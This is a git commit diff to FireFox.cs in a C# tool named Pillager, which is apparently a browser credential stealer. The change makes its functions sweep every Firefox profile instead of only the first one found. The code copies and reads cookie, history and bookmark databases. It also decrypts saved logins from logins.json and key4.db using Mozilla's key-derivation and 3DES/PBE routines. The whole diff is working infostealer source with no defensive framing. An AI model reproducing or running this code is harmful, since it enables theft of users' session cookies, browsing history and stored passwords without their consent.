a0b85725aa2b9534e39d04f64461863ec579ae6b
簞純 <287182701@qq.com>
2023-11-07 21:21:12 +0800

    Update FireFox.cs

--- Pillager/Browsers/FireFox.cs
+++ Pillager/Browsers/FireFox.cs
@@ -19,34 +19,30 @@ namespace Pillager.Browsers
         public static string FireFox_cookies()
         {
             StringBuilder cookies = new StringBuilder();
-            string firefox_cookie_path = "";
             foreach (var directory in Directory.GetDirectories(BrowserPath))
             {
-                string tmp = Path.Combine(directory, "cookies.sqlite");
-                if (File.Exists(tmp))
+                string firefox_cookie_path = Path.Combine(directory, "cookies.sqlite");
+                if (File.Exists(firefox_cookie_path))
                 {
-                    firefox_cookie_path = tmp;
-                    break;
+                    try
+                    {
+                        string cookie_tempFile = Path.GetTempFileName();
+                        File.Copy(firefox_cookie_path, cookie_tempFile, true);
+                        SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
+                        if (!handler.ReadTable("moz_cookies"))
+                            return null;
+                        for (int i = 0; i < handler.GetRowCount(); i++)
+                        {
+                            string host_key = handler.GetValue(i, "host");
+                            string name = handler.GetValue(i, "name");
+                            string cookie = handler.GetValue(i, "value");
+                            cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
+                        }
+                        File.Delete(cookie_tempFile);
+                    }
+                    catch { }
                 }
-            }
-            if (!File.Exists(firefox_cookie_path)) return null;
-            try
-            {
-                string cookie_tempFile = Path.GetTempFileName();
-                File.Copy(firefox_cookie_path, cookie_tempFile, true);
-                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
-                if (!handler.ReadTable("moz_cookies"))
-                    return null;
-                for (int i = 0; i < handler.GetRowCount(); i++)
-                {
-                    string host_key = handler.GetValue(i, "host");
-                    string name = handler.GetValue(i, "name");
-                    string cookie = handler.GetValue(i, "value");
-                    cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
-                }
-                File.Delete(cookie_tempFile);
-            }
-            catch { }
+            }            
 
             return cookies.ToString();
         }
@@ -54,164 +50,153 @@ namespace Pillager.Browsers
         public static string FireFox_history()
         {
             StringBuilder history = new StringBuilder();
-            string firefox_history_path = "";
             foreach (var directory in Directory.GetDirectories(BrowserPath))
             {
-                string tmp = Path.Combine(directory, "places.sqlite");
-                if (File.Exists(tmp))
+                string firefox_history_path = Path.Combine(directory, "places.sqlite");
+                if (File.Exists(firefox_history_path))
                 {
-                    firefox_history_path = tmp;
-                    break;
+                    try
+                    {
+                        string history_tempFile = Path.GetTempFileName();
+                        File.Copy(firefox_history_path, history_tempFile, true);
+                        SQLiteHandler handler = new SQLiteHandler(history_tempFile);
+                        if (!handler.ReadTable("moz_places")) return null;
+                        for (int i = 0; i < handler.GetRowCount(); i++)
+                        {
+                            string url = handler.GetValue(i, "url");
+                            history.AppendLine(url);
+                        }
+                        File.Delete(history_tempFile);
+                    }
+                    catch { }
                 }
             }
-            if (!File.Exists(firefox_history_path)) return null;
-            try
-            {
-                string history_tempFile = Path.GetTempFileName();
-                File.Copy(firefox_history_path, history_tempFile, true);
-                SQLiteHandler handler = new SQLiteHandler(history_tempFile);
-                if (!handler.ReadTable("moz_places")) return null;
-                for (int i = 0; i < handler.GetRowCount(); i++)
-                {
-                    string url = handler.GetValue(i, "url");
-                    history.AppendLine(url);
-                }
-                File.Delete(history_tempFile);
-            }
-            catch { }
+            
             return history.ToString();
         }
 
         public static string FireFox_books()
         {
             StringBuilder books = new StringBuilder();
-            string firefox_books_path = "";
             foreach (var directory in Directory.GetDirectories(BrowserPath))
             {
-                string tmp = Path.Combine(directory, "places.sqlite");
-                if (File.Exists(tmp))
+                string firefox_books_path = Path.Combine(directory, "places.sqlite");
+                if (File.Exists(firefox_books_path))
                 {
-                    firefox_books_path = tmp;
-                    break;
+                    try
+                    {
+                        string books_tempFile = Path.GetTempFileName();
+                        File.Copy(firefox_books_path, books_tempFile, true);
+                        SQLiteHandler handler = new SQLiteHandler(books_tempFile);
+                        if (!handler.ReadTable("moz_bookmarks")) return null;
+                        List<string> fks = new List<string>();
+                        for (int i = 0; i < handler.GetRowCount(); i++)
+                        {
+                            var fk = handler.GetValue(i, "fk");
+                            if (fk != "0")
+                            {
+                                fks.Add(fk);
+                            }
+                        }
+                        handler = new SQLiteHandler(books_tempFile);
+                        if (!handler.ReadTable("moz_places")) return null;
+                        for (int i = 0; i < handler.GetRowCount(); i++)
+                        {
+                            var id = handler.GetRawID(i);
+                            if (fks.Contains(id.ToString()))
+                            {
+                                books.AppendLine(handler.GetValue(i, "url"));
+                            }
+                        }
+                        File.Delete(books_tempFile);
+                    }
+                    catch { }
                 }
             }
-            if (!File.Exists(firefox_books_path)) return null;
-            try
-            {
-                string books_tempFile = Path.GetTempFileName();
-                File.Copy(firefox_books_path, books_tempFile, true);
-                SQLiteHandler handler = new SQLiteHandler(books_tempFile);
-                if (!handler.ReadTable("moz_bookmarks")) return null;
-                List<string> fks = new List<string>();
-                for (int i = 0; i < handler.GetRowCount(); i++)
-                {
-                    var fk = handler.GetValue(i, "fk");
-                    if (fk!="0")
-                    {
-                        fks.Add(fk);
-                    }
-                }
-                handler = new SQLiteHandler(books_tempFile);
-                if (!handler.ReadTable("moz_places")) return null;
-                for (int i = 0; i < handler.GetRowCount(); i++)
-                {
-                    var id = handler.GetRawID(i);
-                    if (fks.Contains(id.ToString()))
-                    {
-                        books.AppendLine(handler.GetValue(i, "url"));
-                    }
-                }
-                File.Delete(books_tempFile);
-            }
-            catch { }
+            
             return books.ToString();
         }
 
         public static string FireFox_passwords()
         {
             StringBuilder password = new StringBuilder();
-            string loginsJsonPath = "";
-            string keyDBPath = "";
             foreach (var directory in Directory.GetDirectories(BrowserPath))
             {
-                string tmp1 = Path.Combine(directory, "logins.json");
-                string tmp2 = Path.Combine(directory, "key4.db");
-                if (File.Exists(tmp1) && File.Exists(tmp2))
+                string loginsJsonPath = Path.Combine(directory, "logins.json");
+                string keyDBPath = Path.Combine(directory, "key4.db");
+                if (File.Exists(loginsJsonPath) && File.Exists(keyDBPath))
                 {
-                    loginsJsonPath = tmp1;
-                    keyDBPath = tmp2;
-                    break;
-                }
-            }
-            if (!File.Exists(loginsJsonPath)|| !File.Exists(keyDBPath)) return null;
-            try
-            {
-                string password_keyDB_tempFile = Path.GetTempFileName();
-                File.Copy(keyDBPath, password_keyDB_tempFile, true);
-                string password_loginsJson_tempFile = Path.GetTempFileName();
-                File.Copy(loginsJsonPath, password_loginsJson_tempFile, true);
-                SQLiteHandler handler = new SQLiteHandler(password_keyDB_tempFile);
-                if (!handler.ReadTable("metadata")) return null;
-                Asn1Der asn = new Asn1Der();
-                for (int i = 0; i < handler.GetRowCount(); i++)
-                {
-                    if (handler.GetValue(i, "id")!="password") continue;
-                    byte[] item2Byte;
-                    var globalSalt = Convert.FromBase64String(handler.GetValue(i, "item1"));
                     try
                     {
-                        item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2"));
-                    }
-                    catch
-                    {
-                        item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2)"));
-                    }
-                    Asn1DerObject item2 = asn.Parse(item2Byte);
-                    string asnString = item2.ToString();
-                    if (asnString.Contains("2A864886F70D010C050103"))
-                    {
-                        var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].Data;
-                        var cipherText = item2.objects[0].objects[1].Data;
-                        decryptMoz3DES CheckPwd = new decryptMoz3DES(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt);
-                        var passwordCheck = CheckPwd.Compute();
-                        string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
-                        if (!decryptedPwdChk.StartsWith("password-check")) return null;
-                    }
-                    else if (asnString.Contains("2A864886F70D01050D"))
-                    {
-                        var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
-                        var partIV = item2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
-                        var cipherText = item2.objects[0].objects[0].objects[1].objects[3].Data;
-                        MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt, partIV);
-                        var passwordCheck = CheckPwd.Compute();
-                        string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
-                        if (!decryptedPwdChk.StartsWith("password-check")) return null;
-                    }
-                    else return null;
-                    try
-                    {
-                        handler = new SQLiteHandler(password_keyDB_tempFile);
-                        if (!handler.ReadTable("nssPrivate")) return null;
-                        for (int j = 0; j < handler.GetRowCount(); j++)
+                        string password_keyDB_tempFile = Path.GetTempFileName();
+                        File.Copy(keyDBPath, password_keyDB_tempFile, true);
+                        string password_loginsJson_tempFile = Path.GetTempFileName();
+                        File.Copy(loginsJsonPath, password_loginsJson_tempFile, true);
+                        SQLiteHandler handler = new SQLiteHandler(password_keyDB_tempFile);
+                        if (!handler.ReadTable("metadata")) return null;
+                        Asn1Der asn = new Asn1Der();
+                        for (int i = 0; i < handler.GetRowCount(); i++)
                         {
-                            var a11Byte = Convert.FromBase64String(handler.GetValue(j, "a11"));
-                            Asn1DerObject a11ASNValue = asn.Parse(a11Byte);
-                            var keyEntrySalt = a11ASNValue.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
-                            var keyPartIV = a11ASNValue.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
-                            var keyCipherText = a11ASNValue.objects[0].objects[0].objects[1].objects[3].Data;
-                            MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), keyEntrySalt, keyPartIV);
-                            var fullprivateKey = PrivKey.Compute();
-                            byte[] privateKey = new byte[24];
-                            Array.Copy(fullprivateKey, privateKey, privateKey.Length);
-                            password.Append(decryptLogins(loginsJsonPath, privateKey));
+                            if (handler.GetValue(i, "id") != "password") continue;
+                            byte[] item2Byte;
+                            var globalSalt = Convert.FromBase64String(handler.GetValue(i, "item1"));
+                            try
+                            {
+                                item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2"));
+                            }
+                            catch
+                            {
+                                item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2)"));
+                            }
+                            Asn1DerObject item2 = asn.Parse(item2Byte);
+                            string asnString = item2.ToString();
+                            if (asnString.Contains("2A864886F70D010C050103"))
+                            {
+                                var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].Data;
+                                var cipherText = item2.objects[0].objects[1].Data;
+                                decryptMoz3DES CheckPwd = new decryptMoz3DES(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt);
+                                var passwordCheck = CheckPwd.Compute();
+                                string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
+                                if (!decryptedPwdChk.StartsWith("password-check")) return null;
+                            }
+                            else if (asnString.Contains("2A864886F70D01050D"))
+                            {
+                                var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
+                                var partIV = item2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
+                                var cipherText = item2.objects[0].objects[0].objects[1].objects[3].Data;
+                                MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt, partIV);
+                                var passwordCheck = CheckPwd.Compute();
+                                string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
+                                if (!decryptedPwdChk.StartsWith("password-check")) return null;
+                            }
+                            else return null;
+                            try
+                            {
+                                handler = new SQLiteHandler(password_keyDB_tempFile);
+                                if (!handler.ReadTable("nssPrivate")) return null;
+                                for (int j = 0; j < handler.GetRowCount(); j++)
+                                {
+                                    var a11Byte = Convert.FromBase64String(handler.GetValue(j, "a11"));
+                                    Asn1DerObject a11ASNValue = asn.Parse(a11Byte);
+                                    var keyEntrySalt = a11ASNValue.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
+                                    var keyPartIV = a11ASNValue.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
+                                    var keyCipherText = a11ASNValue.objects[0].objects[0].objects[1].objects[3].Data;
+                                    MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), keyEntrySalt, keyPartIV);
+                                    var fullprivateKey = PrivKey.Compute();
+                                    byte[] privateKey = new byte[24];
+                                    Array.Copy(fullprivateKey, privateKey, privateKey.Length);
+                                    password.Append(decryptLogins(loginsJsonPath, privateKey));
+                                }
+                            }
+                            catch { }
                         }
+                        File.Delete(password_keyDB_tempFile);
+                        File.Delete(password_loginsJson_tempFile);
                     }
                     catch { }
                 }
-                File.Delete(password_keyDB_tempFile);
-                File.Delete(password_loginsJson_tempFile);
             }
-            catch { }
+            
             return password.ToString();
         }
 
